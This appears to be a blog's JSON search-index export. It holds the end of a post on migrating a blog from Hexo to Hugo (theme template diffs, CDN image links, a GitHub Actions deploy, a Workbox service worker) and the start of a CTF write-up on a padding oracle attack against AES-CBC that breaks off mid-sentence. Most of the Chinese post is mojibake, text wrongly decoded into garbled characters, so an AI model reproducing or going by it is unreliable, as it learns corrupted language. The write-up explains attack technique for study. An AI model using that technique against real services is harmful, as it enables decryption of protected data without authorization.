è¯¦æƒ…å†…å®¹æ‰€ä½¿ç”¨ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬ç›´æ¥å°†å…¶ç®€å•æ›¿æ¢ä¸ºä¹‹æ‘˜è¦å†…å®¹çš„è¯ï¼Œè™½ç„¶ä¸»é¡µå±•ç¤ºäº†æ–‡ç« æ‘˜è¦ï¼Œä½†æ˜¯æ–‡ç« è¯¦æƒ…å†…å®¹ä¹Ÿä¼šå±•ç¤ºå†…å®¹æ‘˜è¦ï¼Œè€Œä¸”åŒæ—¶æ˜¾ç¤ºæ–‡ç« å…¨éƒ¨å†…å®¹ï¼Œå°±ä¼šæœ‰ä¸¤æ®µé‡å¤çš„å†…å®¹äº†ã€‚\næ‰€ä»¥æˆ‘ä»¬åªèƒ½åˆ†åˆ«å¤„ç†ï¼Œä¹Ÿå°±æ˜¯è¯´å¢åŠ ä¸€ä¸ªæ–‡ä»¶ï¼Œè®©ä¸»é¡µå¼•ç”¨ï¼Œæ–‡ç« è¯¦æƒ…å†…å®¹é¡µé¢ä¸å¼•ç”¨å°±ä¸ä¼šå‡ºç°è¿™ç§é—®é¢˜äº†ã€‚\næœ€ç»ˆä¿®æ”¹ï¼š\nåˆ é™¤äº† themes/stack/layouts/partials/article/components/details.html é¡µé¢ä¸­çš„\n- {{ with .Params.description }} - \u0026lt;h3 class=\u0026#34;article-subtitle\u0026#34;\u0026gt; - {{ . }} - \u0026lt;/h3\u0026gt; - {{ end }} åœ¨ themes/stack/layouts/partials/article/components å¢åŠ äº†ä¸€ä¸ªæ–°æ–‡ä»¶ä¸º article-intro.html ï¼Œæ–‡ä»¶å†…å®¹ä¸åˆ é™¤ä¸Šè¿°å†…å®¹å‰çš„ details.html æ–‡ä»¶ç•¥æœ‰ä¸åŒï¼š\n@@ -15,11 +15,11 @@  \u0026lt;/a\u0026gt; \u0026lt;/h2\u0026gt; - {{ with .Params.description }} - \u0026lt;h3 class=\u0026#34;article-subtitle\u0026#34;\u0026gt; + {{ with .Summary }} + \u0026lt;div class=\u0026#34;article-subtitle\u0026#34;\u0026gt;  {{ . | safeHTML}} - \u0026lt;/h3\u0026gt; - {{ end }} --\u0026gt; + \u0026lt;/div\u0026gt; + {{ end }}  {{ if or (not .Date.IsZero) (.Site.Params.article.readingTime) }} \u0026lt;footer class=\u0026#34;article-time\u0026#34;\u0026gt; @@ -40,6 +40,9 @@  \u0026lt;/time\u0026gt; \u0026lt;/div\u0026gt; {{ end }} + \u0026lt;div\u0026gt; + \u0026lt;a href=\u0026#34;{{ .RelPermalink }}\u0026#34;\u0026gt;Read Moreâ€¦\u0026lt;/a\u0026gt; + \u0026lt;/div\u0026gt;  \u0026lt;/footer\u0026gt; {{ end }} \u0026lt;/div\u0026gt; è¿™é‡Œä½¿ç”¨äº† Hugo æä¾›çš„.Summaryè·å–æ–‡ç« æ‘˜è¦ï¼Œæ›¿æ¢æ‰äº†åŸæ¥æ–‡ç« æè¿°çš„ä½ç½®ï¼Œå¹¶å¢åŠ äº†â€œé˜…è¯»æ›´å¤šâ€çš„å…¥å£ã€‚æ¥ç€æˆ‘ä»¬è¿˜éœ€è¦å¢åŠ ä¸€ä¸ª themes/stack/layouts/partials/article/components/header-intro.html æ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹ä¸ header.html åŒºåˆ«å¦‚ä¸‹ï¼š\n@@ -31,5 +31,5 @@  \u0026lt;/div\u0026gt; {{ end }} - {{ partialCached \u0026#34;article/components/details\u0026#34; . .RelPermalink }} + {{ partialCached \u0026#34;article/components/article-intro\u0026#34; . .RelPermalink }}  \u0026lt;/header\u0026gt; è¿™é‡Œåªéœ€è¦å°†æˆ‘ä»¬æ‰€æ›´æ”¹çš„ artile-intro ä»£æ›¿ä¹‹å‰çš„ details å¼•å…¥å³å¯ã€‚\nShortCodes è¿™é‡Œä¸»è¦å‚è€ƒçš„æ–‡ç« æ˜¯ï¼šè‡ªå®šä¹‰ Hugo Shortcodes ç®€ç  å½“ä¸­çš„ notice éƒ¨åˆ†ï¼Œé™¤äº†è‡ªå·±åšäº†ä¸€å®šçš„å­—ä½“ã€é¢œè‰²å®šåˆ¶è°ƒæ•´ï¼Œå…¶ä»–åŸºæœ¬ä¸Šä¸€æ‘¸ä¸€æ ·ï¼Œæ‰€ä»¥è¿™é‡Œä¸å†èµ˜è¿°ã€‚\næ ·å¼æ•ˆæœï¼š\n{{\u0026lt; notice notice-warning \u0026gt;}} Hello World! {{\u0026lt; /notice \u0026gt;}}  Hello World!\n {{\u0026lt; notice notice-info \u0026gt;}} Hello World! {{\u0026lt; /notice \u0026gt;}}  Hello World!\n {{\u0026lt; notice notice-note \u0026gt;}} Hello World! {{\u0026lt; /notice \u0026gt;}}  Hello World!\n {{\u0026lt; notice notice-tip \u0026gt;}} Hello World! {{\u0026lt; /notice \u0026gt;}}  Hello World!\n å¹¶ä¸”è¿™é‡Œç®€å•æä¸ªé†’ï¼Œå¯¹äº Hugo æ¥è¯´ï¼Œæ—¢æ˜¯ä½ æ˜¯åœ¨ä»£ç æ®µé‡Œé¢å†™ ShortCodes ï¼ŒHugo ä¹Ÿä¼šç›´æ¥å¯¹å…¶è¿›è¡Œæ¸²æŸ“ï¼Œå¹¶ä¸ä¼šå°†å…¶è§†ä¸ºå­—ç¬¦ä¸²å¤„ç†ã€‚\næ‰€ä»¥å½“æ—¶æˆ‘åœ¨æ¸²æŸ“ä»¥ä¸Š Shortcodes çš„æ—¶å€™å°±é‡åˆ°äº†è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¾—åœ¨ä¸éœ€è¦æ¸²æŸ“çš„ ShortCodes ä»£ç åŠ æ³¨é‡Šæ‰èƒ½ä½¿å¾— Hugo è®¤ä¸ºè¿™æ˜¯ä¸€æ®µå­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯å¦‚ä¸‹è¿™ä¸ªæ ·å­ï¼š  carbon.png \nCDN For IMG å› ä¸º Stack ä¸»é¢˜æ¨èåœ¨æ–‡ç« å†…æ’å…¥å›¾ç‰‡ä½¿ç”¨ Hugo çš„ Page Bundleopen åŠŸèƒ½[3]ï¼Œè€Œå¤–å±‚æˆ‘ä½¿ç”¨çš„æ˜¯ CloudFlare åš CDN ï¼Œå°½ç®¡ä½¿ç”¨äº†ä¸€äº›å‹ç¼©å¤„ç†å°è¯•å°½å¯èƒ½ä¼˜åŒ–å›¾ç‰‡åŠ è½½é€Ÿåº¦ï¼Œä½†æ˜¯ CloudFlare å¯¹äºå›½å†…â€œåŠ é€Ÿâ€æ•ˆæœå±å®éš¾ä»¥è‹ŸåŒï¼Œå¥½åœ¨ jsdelivr æä¾›äº†åŸºäº Github ä»“åº“èµ„æºçš„åŠ é€ŸæœåŠ¡ï¼Œå¹¶ä¸”åœ¨å›½å†…åŠ é€Ÿæ•ˆæœè¿˜ä¸é”™ï¼Œæ‰€ä»¥æˆ‘è¿˜é’ˆå¯¹é“¾æ¥åˆ°æœ¬åœ°çš„å›¾ç‰‡èµ„æºåœ¨ç”Ÿæˆå›¾ç‰‡é“¾æ¥æ—¶è‡ªåŠ¨åŠ ä¸Šäº† jsdelivr é“¾æ¥ã€‚\næ€è·¯éå¸¸ç®€å•ï¼Œå› ä¸ºç”Ÿæˆå›¾ç‰‡é“¾æ¥æ˜¯ä½¿ç”¨çš„ç›¸å¯¹è·¯å¾„ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å¯¹è¿™äº›ç›¸å¯¹è·¯å¾„çš„å›¾ç‰‡è¿›è¡Œå¤„ç†å³å¯ï¼ŒåŠ ä¸Š jsdelivr åˆ°è‡ªå·±çš„ Github Page åšå®¢ä»“åº“å¼€å¤´å³å¯ã€‚ä¾‹å¦‚ï¼Œæˆ‘çš„åšå®¢ä»“åº“ä¸º https://github.com/ZeddYu/ZeddYu.github.io ï¼Œåˆ†æ”¯ä¸º master åˆ†æ”¯ï¼Œå¯¹åº”çš„ jsdelivr åŠ é€Ÿé“¾æ¥ä¸º https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/ ã€‚\næ‰¾åˆ°ä¸»é¢˜å¯¹äºæœ¬åœ°å›¾ç‰‡ç”Ÿæˆå¤„ç†çš„åœ°æ–¹ï¼Œä¸º themes/stack/layouts/_default/_markup/render-image.html æ–‡ä»¶ï¼Œ\n{{- if $image -}} \u0026lt;img src=\u0026quot;https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/{{ $Permalink| relURL }}\u0026quot; {{- else -}} \u0026lt;img src=\u0026quot;{{ $Permalink }}\u0026quot; {{- end -}} å°† img å¯¹åº”çš„é“¾æ¥æ‰‹åŠ¨åŠ ä¸Š jsdelivr çš„é“¾æ¥ï¼Œä½†æ˜¯éœ€è¦æ‰‹åŠ¨åŠ ä¸Šåˆ¤æ–­ï¼Œè¿™ä¸ª$imageæ˜¯ä¸Šæ–‡ç»™çš„åˆ¤æ–­æ˜¯å¦ä¸ºæœ¬åœ°å›¾ç‰‡çš„å˜é‡ï¼›å¯¹äºå¤–é“¾æˆ‘ä»¬ä¸éœ€è¦ä½¿ç”¨ jsdelivr é“¾æ¥å‰ç¼€è¿›è¡ŒåŠ é€Ÿï¼Œæ‰€ä»¥è¿™é‡Œåªéœ€è¦å¯¹æœ¬åœ°å›¾ç‰‡ jsdelivr åŠ é€Ÿå³å¯ã€‚\nGithub Action æœ€åé…ç½® .github/workflows/gh-pages.yml ä½¿ç”¨ Github Action è‡ªåŠ¨åŒ–éƒ¨ç½²ï¼Œè¿™é‡Œæˆ‘çš„é…ç½®ä¸ºç§æœ‰çš„åšå®¢æºä»£ç ä»“åº“ï¼Œåšå®¢é™æ€ä»£ç ä»“åº“ä¸ºå…¬å¼€ä»“åº“ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨åˆ° Github çš„ä¸ªäºº Access Token ï¼Œå…¶ä½™çš„ä¸å†èµ˜è¿°ã€‚\nname:github pageson:push:branches:- master # Set a branch to deploypull_request:jobs:deploy:runs-on:ubuntu-20.04steps:- uses:actions/checkout@v2with:submodules:true# Fetch Hugo themes (true OR recursive)fetch-depth:0# Fetch all history for .GitInfo and .Lastmod- name:Setup Hugouses:peaceiris/actions-hugo@v2with:hugo-version:\u0026#39;latest\u0026#39;extended:true- name:Buildrun:hugo --minify- name:Deployuses:peaceiris/actions-gh-pages@v3with:external_repository:ZeddYu/ZeddYu.github.io\t# å‘å¸ƒåˆ°å“ªä¸ª repopersonal_token:${{ secrets.HUGO_TOKEN }}\t# å‘å¸ƒåˆ°å…¶ä»– repo éœ€è¦æä¾›ä¸Šé¢ç”Ÿæˆçš„ personal access tokenpublish_dir:./public\t# æ³¨æ„è¿™é‡ŒæŒ‡çš„æ˜¯è¦å‘å¸ƒå“ªä¸ªæ–‡ä»¶å¤¹çš„å†…å®¹ï¼Œè€Œä¸æ˜¯æŒ‡å‘å¸ƒåˆ°ç›®çš„ä»“åº“çš„ä»€ä¹ˆä½ç½®ï¼Œå› ä¸º hugo é»˜è®¤ç”Ÿæˆé™æ€ç½‘é¡µåˆ° public æ–‡ä»¶å¤¹ï¼Œæ‰€ä»¥è¿™é‡Œå‘å¸ƒ public æ–‡ä»¶å¤¹é‡Œçš„å†…å®¹publish_branch:master\t# å‘å¸ƒåˆ°å“ªä¸ª branchWorkbox For Dark Theme è™½ç„¶æœ¬åœ°æµ‹è¯•çš„æ—¶å€™çœ‹èµ·æ¥ååˆ†é¡ºç•…ï¼Œä½†æ˜¯åœ¨ä½¿ç”¨éƒ¨ç½²åˆ°è¿œç¨‹åï¼Œå¯èƒ½ç”±äº CloudFlare å¯¹å›½å†…çš„å‡é€Ÿä½œç”¨ï¼Œä»¥åŠä¸»é¢˜å¯¹äºé»‘æš—æ¨¡å¼çš„å®ç°ä½¿ç”¨çš„æ˜¯ javascript è¦†ç›–å®ç°ï¼Œè€Œåº”ç”¨é»‘æš—æ¨¡å¼ js æ–‡ä»¶åŠ è½½é€Ÿåº¦è¾ƒæ…¢çš„æƒ…å†µä¸‹ï¼Œä¼šå¯¼è‡´åœ¨é»‘æš—æ¨¡å¼åœ¨åˆ‡æ¢é¡µé¢çš„æ—¶å€™ï¼Œä¼šåœ¨åŠ è½½å…¶ä»–çš„æ—¶å€™ä¼šæ¢å¤åˆ°ç™½è‰²çš„èƒŒæ™¯ï¼Œå¯¼è‡´â€œé—ªå±â€æ•ˆåº”ã€‚è¿™å¯¹ç”¨æˆ·è‚¯å®šæ˜¯éå¸¸ä¸å‹å¥½çš„ä½“éªŒï¼Œæ‰€ä»¥ç»è¿‡ä¸€äº›å°è¯•ï¼Œè™½ç„¶æ— æ³•å®Œç¾è§£å†³æ‰è¿™ä¸ªé—®é¢˜ï¼Œä½†æ˜¯åœ¨ä¸€å®šç¨‹åº¦ä¸Šæœ‰æ•ˆå‡ç¼“äº†è¿™ä¸ªé—®é¢˜çš„å‘ç”Ÿã€‚\nè¿™é‡Œä¹Ÿé—®äº†ä¸€ä¸‹å‰ç«¯å¤§å¸ˆ @rex ï¼Œä»–ä¸€å¼€å§‹ç»™æˆ‘çš„æ–¹æ¡ˆæ˜¯è®©æˆ‘ä½¿ç”¨ PWAï¼ˆProgressive Web Appsï¼Œæ¸è¿›å¼Web åº”ç”¨ï¼‰ï¼Œå°è¯•ä½¿ç”¨ Web App Manifest ï¼Œå¯ä»¥åœ¨ static æ–‡ä»¶å¤¹ä¸‹å¢åŠ  manifest.json æ¥é¢„åŠ è½½èƒŒæ™¯é¢œè‰²ã€‚\n{ \u0026#34;name\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;display\u0026#34;: \u0026#34;standalone\u0026#34;, \u0026#34;background_color\u0026#34;: \u0026#34;#303030\u0026#34;, \u0026#34;theme_color\u0026#34;: \u0026#34;#303030\u0026#34; } ä¸»é¢˜é»‘æš—æ¨¡å¼çš„èƒŒæ™¯é¢œè‰²ä¸º#303030 ï¼Œè™½ç„¶ç†è®ºä¸Šå¯èƒ½ä¼šå½±å“åˆ°æ—¥é—´æ¨¡å¼çš„åˆ‡æ¢ï¼Œä½†æ˜¯å®é™…ä¸Šæ—¢æ²¡æœ‰å½±å“åˆ°æ—¥é—´æ¨¡å¼ï¼Œå¯¹â€œé—ªå±â€æ•ˆåº”ä¹Ÿæ²¡æœ‰å®è´¨æ€§çš„ã€‚\nè·Ÿ @rex å†æ¬¡è®¨è®ºäº†ä¸€ä¸‹ï¼Œç›®å‰æœ€ä¼˜çš„å¤œé—´æ¨¡å¼çš„å®ç°æ–¹å¼åº”è¯¥æ˜¯åœ¨æœåŠ¡å™¨ç«¯å­˜å‚¨ç”¨æˆ·è®¾ç½®çš„æ¨¡å¼ä¿¡æ¯ï¼Œå½“ç”¨æˆ·è¯·æ±‚çš„æ—¶å€™ï¼Œæ ¹æ® Cookie æˆ–è€…å…¶ä»–ä¿¡æ¯è¿”å›ä¸åŒçš„æ ·å¼ï¼Œè¿™æ ·å°±èƒ½å®Œç¾é¿å¼€â€œé—ªå±â€è¿™ä¸ªé—®é¢˜äº†ï¼Œå¹¶ä¸”å¯¹äºè‡ªé€‚åº”æ¨¡å¼è¿˜å¯ä»¥é€šè¿‡åª’ä½“æŸ¥è¯¢æ¥å®ç°ï¼›å…¶æ¬¡å®ç°æ–¹å¼æ‰æœ‰å¯èƒ½ä½¿ç”¨ js è¦†ç›–çš„å½¢å¼ï¼Œé€šè¿‡ localstorage æˆ–è€…æœ¬åœ°æµè§ˆå™¨çš„å­˜å‚¨ä»‹è´¨ç­‰è·å–ç”¨æˆ·å­˜å‚¨çš„ä¸»é¢˜è®¾ç½®ï¼Œå†å¯¹é¡µé¢è¿›è¡Œé¢œè‰²è¦†ç›–ï¼Œä½†æ˜¯è¿™ä¸ªæ–¹æ¡ˆæ¯”è¾ƒä¾é ç½‘ç»œé€Ÿåº¦ï¼Œå› ä¸ºå¦‚æœç½‘ç»œä¸ä½³ï¼Œå¯¹äº js æ–‡ä»¶åŠ è½½ç¼“æ…¢çš„è¯å°±ä¼šå¯¼è‡´å…ˆå‡ºç°é»˜è®¤ä¸»é¢˜é¢œè‰²ï¼Œå†å‡ºç°ç”¨æˆ·è®¾ç½®çš„ä¸»é¢˜é¢œè‰²ï¼Œå°±ä¼šäº§ç”Ÿâ€œé—ªå±â€ç°è±¡ã€‚\næ‰€ä»¥é€šè¿‡åˆ†æï¼Œæˆ‘ä»¬ç›®å‰å¤§æ¦‚çŸ¥é“â€œé—ªå±â€æœ€å¥½çš„è§£å†³æ–¹æ¡ˆæ˜¯æ ¹æ®ç”¨æˆ·è®¾ç½®è¿”å›ä¸åŒçš„æ ·å¼æ–‡ä»¶ï¼Œä½†æ˜¯å¯¹äºé™æ€é¡µé¢ Github Pages ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆåŠæ³•ç›´æ¥è¯†åˆ«ç”¨æˆ·ï¼Œå³ä½¿æ˜¯éƒ¨ç½²äº† CloudFlare ï¼Œç›®å‰ CloudFlare workers ä¹Ÿæ²¡æœ‰ä»€ä¹ˆåŠæ³•èƒ½å¤Ÿå®ç°ç±»ä¼¼æ•ˆæœã€‚åœ¨ä¸æ”¹å˜é™æ€é¡µé¢çš„æ¶æ„ä¸‹ï¼Œåªèƒ½é€šè¿‡å°è¯•è§£å†³ç½‘ç»œåŠ è½½é€Ÿåº¦æ¥å‡ç¼“è¿™ä¸ªé—®é¢˜ã€‚\näºæ˜¯æˆ‘æƒ³åˆ°äº† Service Worker ï¼Œå¦‚æœæˆ‘ä»¬èƒ½é€šè¿‡ SW å°†é™æ€æ–‡ä»¶ç¼“å­˜åˆ°ç”¨æˆ·æœ¬åœ°ï¼Œå°±å¯èƒ½å¯ä»¥å°½é‡é¿å…ç½‘ç»œé—®é¢˜äº†ã€‚äºæ˜¯åœ¨ç»è¿‡ä¸€ç•ªæ¢ç´¢ï¼Œå‘ç°äº† Workbox è¿™ä¸ªæ¯”è¾ƒå®Œå–„çš„è§£å†³æ–¹æ¡ˆã€‚Workbox æ˜¯ Google Chrome å›¢é˜Ÿæ¨å‡ºçš„ä¸€å¥— PWA çš„è§£å†³æ–¹æ¡ˆï¼Œè¿™å¥—è§£å†³æ–¹æ¡ˆå½“ä¸­åŒ…å«äº†æ ¸å¿ƒåº“å’Œæ„å»ºå·¥å…·ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ Workbox å®ç° Service Worker çš„å¿«é€Ÿå¼€å‘ã€‚\nWorkbox è¯´åˆ°åº•è¿˜æ˜¯ SW ï¼Œå…¶æ³¨å†Œä½¿ç”¨ä¸ SW å¹¶æ²¡æœ‰ä»€ä¹ˆä¸åŒï¼Œæ‰€ä»¥æˆ‘ä»¬è‚¯å®šå¾—åœ¨ä¸»é¢˜æ³¨å†Œ SW æ–‡ä»¶ã€‚è¿™é‡Œæˆ‘é€‰æ‹©åœ¨ themes/stack/layouts/partials/footer/components/script.html æ–‡ä»¶ä¸­æ³¨å†Œ sw æ–‡ä»¶\n\u0026lt;script\u0026gt; if (\u0026#39;serviceWorker\u0026#39; in navigator) { window.addEventListener(\u0026#39;load\u0026#39;, function() { navigator.serviceWorker.register(\u0026#39;/sw.js\u0026#39;); }); } \u0026lt;/script\u0026gt; æ ¹ç›®å½•ä¸‹çš„ sw.js æ–‡ä»¶å°±éœ€è¦åœ¨ static ç›®å½•ä¸‹æ”¾ç½®æ–‡ä»¶\nimportScripts(\u0026#34;https://cdn.jsdelivr.net/npm/workbox-cdn/workbox/workbox-sw.js\u0026#34;); if (workbox) { console.log(`Yay! Workbox is loaded ğŸ‰`); workbox.routing.registerRoute( /\\.(?:js|css)$/, new workbox.strategies.StaleWhileRevalidate({ cacheName: \u0026#34;static-resources\u0026#34;, }) ); workbox.routing.registerRoute( \u0026#34;https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//ts/main.js\u0026#34;, new workbox.strategies.StaleWhileRevalidate({ cacheName: \u0026#34;static-resources\u0026#34;, }) ); workbox.routing.registerRoute( /\\.(?:png|jpg|jpeg|svg|gif)$/, new workbox.strategies.CacheFirst({ cacheName: \u0026#34;image-cache\u0026#34;, plugins: [ new workbox.expiration.ExpirationPlugin({ maxEntries: 20, maxAgeSeconds: 7 * 24 * 60 * 60, }), ], }) ); workbox.routing.registerRoute( /^https:\\/\\/fonts\\.googleapis\\.com/, new workbox.strategies.StaleWhileRevalidate({ cacheName: \u0026#34;google-fonts-stylesheets\u0026#34;, }) ); workbox.routing.registerRoute( /^https:\\/\\/fonts\\.gstatic\\.com/, new workbox.strategies.CacheFirst({ cacheName: \u0026#34;google-fonts-webfonts\u0026#34;, plugins: [ new workbox.cacheableResponse.CacheableResponsePlugin({ statuses: [0, 200], }), new workbox.expiration.ExpirationPlugin({ maxAgeSeconds: 60 * 60 * 24 * 365, maxEntries: 30, }), ], }) ); } else { console.log(`Boo! Workbox didn\u0026#39;t load ğŸ˜¬`); } ä»¥ä¸Šå¯¹å›¾ç‰‡ç­‰ä¸€äº›é™æ€èµ„æºéƒ½åšäº†ç¼“å­˜ï¼Œå½“ç„¶æœ€ä¸»è¦çš„è¿˜æ˜¯ç¼“å­˜æ“ä½œè¦†ç›–ä¸»é¢˜çš„ main.js æ–‡ä»¶ï¼Œä¸ºäº†åŠ å¿«è¿™ä¸ªæ–‡ä»¶è·å–ï¼Œæˆ‘è¿˜ç‰¹åœ°ç»™è¯¥æ–‡ä»¶ä½¿ç”¨äº† jsdelivr è¿›è¡ŒåŠ é€Ÿã€‚è¿™é‡Œå€¼å¾—æ³¨æ„çš„å°±æ˜¯ï¼ŒService Worker é»˜è®¤åªç¼“å­˜æœ¬ç«™é“¾æ¥çš„é™æ€æ–‡ä»¶ï¼Œå¦‚æœéœ€è¦åŠ è½½å…¶ä»–ç«™ç‚¹çš„æ–‡ä»¶ï¼Œå°±éœ€è¦é€šè¿‡registerRouteæ¥æ³¨å†Œè¯¥æ–‡ä»¶ã€‚\nå†ç»è¿‡ä¸€ç•ªæŠ˜è…¾åï¼Œåœ¨ä½¿ç”¨äº† jsdelivr CDN åŠ é€Ÿ js æ–‡ä»¶ã€Service Worker ç¼“å­˜é™æ€æ–‡ä»¶åŒåŠ æŒä¸‹ï¼ŒåŸºæœ¬å¯ä»¥åšåˆ°æ— ç—›åˆ‡æ¢é¡µé¢äº†ã€‚ï¼ˆå°½ç®¡çœ‹èµ·æ¥è¿˜æ˜¯å¯èƒ½ä¼šæœ‰ 25ms çš„ç¬é—´ç™½å±\u0026hellip;ä½†æ˜¯åº”è¯¥å¯ä»¥è¯´æ˜¯å¾ˆå¤§ç¨‹åº¦ä¸Šç¼“å‡äº†è¿™ä¸ªé—®é¢˜ï¼Œå½“ç„¶å¾—ç­‰ä»¥åçœ‹çœ‹è¿˜æœ‰æ²¡æœ‰ä»€ä¹ˆæ–°çš„æŠ€æœ¯å¯ä»¥æ¥æ”¹å–„è¿™ä¸ªé—®é¢˜äº†ã€‚\n Snipaste_2021-10-02_14-10-17.png \nIssues ä»¥ä¸‹æ˜¯åœ¨è¿ç§»è¿‡ç¨‹ä¸­é‡åˆ°çš„ä¸€äº›æŠ¥é”™é”™è¯¯\nFailed to render pages Failed to render pages: render of \u0026quot;page\u0026quot; failed: execute of template failed: template: posts/single.html:277:98: executing \u0026quot;no-content\u0026quot; at \u0026lt;partial \u0026quot;function/content.html\u0026quot;\u0026gt;: error calling partial: \u0026quot;/Users/zedd/Desktop/demo/quickstart/themes/uBlogger/layouts/partials/function/content.html:12:15\u0026quot;: execute of template failed: template: partials/function/content.html:12:15: executing \u0026quot;partials/function/content.html\u0026quot; at \u0026lt;partial \u0026quot;function/checkbox.html\u0026quot; $content\u0026gt;: error calling partial: partial that returns a value needs a non-zero argument. Total in 19 ms å¼•èµ·è¿™ä¸ªæŠ¥é”™çš„å¯èƒ½åŸå› å°±æ˜¯æ–‡ç« å½“ä¸­æœ‰ä¸€äº›ä¸è§„èŒƒçš„ Markdown è¯­æ³•ï¼Œä¾‹å¦‚æˆ‘æ‰¾å‡ºæ¥çš„å°±æ˜¯å¤åˆ¶ä¸€äº›é“¾æ¥æ—¶å€™æœ‰ä¸€äº›ä¸è§„èŒƒçš„è¯­æ³•ï¼š\n[https://baidu.com](\u0026lt;[https://baidu.com](https://baidu.com)\u0026gt;) è¯¸å¦‚æ­¤ç±»ï¼Œåªè¦æŠŠè¿™äº›å¼•èµ·é”™è¯¯çš„è¯­æ³•ä¿®æ­£æˆè§„èŒƒçš„é“¾æ¥è¯­æ³•å³å¯ã€‚\nrss error on line PCDATA invalid Char value X åœ¨ç”Ÿæˆ RSS æ–‡ä»¶çš„æ—¶å€™å¯èƒ½å¼•èµ·å¦‚ä¸‹æŠ¥é”™ï¼š\nThis page contains the following errors: error on line 455 at column 40: PCDATA invalid Char value 8 è¿™ä¸ªæŠ¥é”™å¯èƒ½åŸå› å°±æ˜¯ç”Ÿæˆçš„ RSS æ–‡ä»¶å½“ä¸­åŒ…å«æœ‰ä¸å¯è§å­—ç¬¦ï¼Œæ¯”å¦‚ä»¥ä¸Šä¾‹å­å°±æ˜¯å­˜åœ¨ \\x08 å­—ç¬¦ï¼Œå¯ä»¥æ ¹æ®æŠ¥é”™å®šä½ä¸€ä¸‹ä½ç½®ï¼Œç„¶åå» markdown æ–‡ä»¶å½“ä¸­è¿›è¡Œåˆ é™¤\nReferences  æµ…è°ˆæˆ‘ä¸ºä»€ä¹ˆä» HEXO è¿ç§»åˆ° HUGO åšå®¢ç³»ç»Ÿè¿ç§»ï¼šHexo åˆ° Hugo Hugo Stack ä¸»é¢˜æ–‡æ¡£ ","date":"2021-09-30T01:15:01+08:00","permalink":"https://blog.zeddyu.info/2021/09/30/2021-09-30-FromHexoToHugo/","title":"ä» Hexo æ¬è¿è‡³ Hugo"},{"content":"This is the fork of my friend\u0026rsquo;s blog: Writeup for Web-Checkin in CyBRICS CTF 2021. We have worked together for two days to solve the hardest web CheckIn in the CybricsCTF 2021. It is nearly a crypto challenge but I think it deserves a writeup.\n[toc]\nTL;DR Padding Oracle Attack + Bit Flip Attack + XSS\nThis is a hard web challenge in CyBRICS CTF 2021. For some reason, the challenge was ZERO solved during the competition. The author fixed some bug after the competition and announced that anyone who can solve it would receive a reward. We managed to solve it and was one of the only two teams that claimed the reward.\nReconnaissance This challenge simulates a flight booking site, where we can search for flight tickets, buy tickets, and upload tickets to be registered.\nBy submitting a form on http://207.154.224.121:8080/finalize?fisrtName=xxx\u0026amp;lastName=xxx, we will receive a aztec code, which embeds a piece of base64-encoded data.\nWe can upload the aztec code through http://207.154.224.121:8080/upload, and get a successful \u0026ldquo;you are now registered\u0026rdquo; response (but this\u0026rsquo;s not what we want).\nLater, we found something interesting after changing some byte of the base64-encoded data. We got a \u0026ldquo;PADDING_ERROR\u0026rdquo; response by modifying some byte of the data. It immediately occurred to us that this might well be an instance of padding oracle attack.\nTo confirm the intuition we just developed, we generated a aztec code, base64 decoded it into ciphertext, XORed every 256 possible byte value (0~256) in the last byte of the second last ciphertext block, base64 encoded back to a aztec code (utilizing python aztec_code_generator module), and uploaded the aztec code to the server. We received 256 responses, 255 of whose status code is 200, with only one response whose status code is 500. Among the 255 responses, XORing by b\u0026quot;\\x00\u0026quot; in the last byte got a \u0026ldquo;Success\u0026rdquo; reponse and the remaining 254 are all \u0026ldquo;PADDING_ERROR\u0026rdquo; responses. This implied that only the \u0026ldquo;Success\u0026rdquo; response one and the 500 status code one got correctly padded plaintext after decryption on the server side. The \u0026ldquo;Success\u0026rdquo; response was due to it\u0026rsquo;s the original unmodified padded plaintext, while the 500 status code one was because the plaintext after decryption was somewhat modified to be correctly padded and we can gain knowledge of the last byte of the original plaintext by making use of this.\nBy continously sending carefully modified ciphertext to the server and then distinguishing whether or not the server responses with \u0026ldquo;PADDING_ERROR\u0026rdquo;, we can recover the whole plaintext byte by byte. This is the so-called padding oracle attack.\nPadding Oracle Attack So, how does the padding oracle attack work?\n First, we need to understand what is padding.\nIt is known that block ciphers can transform (encrypt/decrypt) a plaintext/ciphertext block. 16 bytes data in the case of AES, into a ciphertext/plaintext block. Using some block cipher mode of operation, we can repeatedly apply the block cipher encrypting/decrypting operation on amouts of data whose length is more than a block. For example, AES-CBC mode can encrypt/decrypt multiple blocks. But what if the length of data is not a multiple of the block length? The answer is to use some kind of padding methods, which append some data at the end of the last block to make it a full block.\nOne of the most widely used padding method is PKCS#7 padding method. PKCS#7 first calculates the number of bytes ( pad_length) to be padded, and then appends to the last plaintext block pad_length bytes, with each byte value being pad_length. Upon unpadding, the last byte of the decryption result is extracted and parsed as the pad_length, after which pad_length long bytes are truncated at the end. Below is a Python implementation of PKCS#7 padding and unpadding.\ndef pad(pt): pad_length = 16 - len(pt)%16 pt += bytes([pad_length]) * pad_length return pt def unpad(pt): pad_length = pt[-1] if not 1 \u0026lt;= pad_length \u0026lt;= 16: return None if pad(pt[:-pad_length]) != pt: return None return pt[:-pad_length] Note that a valid padding check is done after unpadding. This means that only the following 16 formats of the last block is considered as valid. All the other formats of data are invalid and will produce a PADDING_ERROR response, which is a padding oracle that we will exploit later.\n Another point to be noted is that, even if the length of plaintext is a multiple of the block size, padding is still needed. In this case, 0x10 bytes will be appended, with each byte value being \\x10.\n  image-20210729103443272 \n Before moving on, we also need to be fimilar with AES-CBC, which is the most common mode that padding oracle attack can be mounted on.\nIn CBC mode, plaintext is padded and divided into several plaintext blocks. Each plaintext block is XORed with the previous ciphertext block before being AES encrypted. The first plaintext block is XORed with a randomly generated initializaiton vector (IV). The final encryption result is the concatenation of the ciphertext blocks with IV at the head. Decryption just reverses these operations.\n image-20210729140911415 \nOne significant drawback of AES-CBC is that 